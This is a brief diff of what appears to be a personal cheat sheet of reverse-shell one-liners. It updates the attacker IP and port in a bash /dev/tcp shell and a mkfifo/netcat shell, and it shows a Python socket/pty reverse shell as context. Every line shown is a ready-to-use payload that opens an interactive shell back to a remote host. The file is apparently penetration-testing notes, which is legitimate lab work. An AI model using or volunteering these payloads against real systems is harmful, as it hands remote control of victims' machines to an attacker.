@@ -7,9 +7,9 @@
  ###### reverse shells
 ```bash
 # bash-1
-bash -i >& /dev/tcp/192.168.45.180/4444 0>&1
+bash -i >& /dev/tcp/192.168.45.151/4444 0>&1
 # bash-2
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.180 4444 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.151 443 >/tmp/f
 # python-1
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.2.6",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 
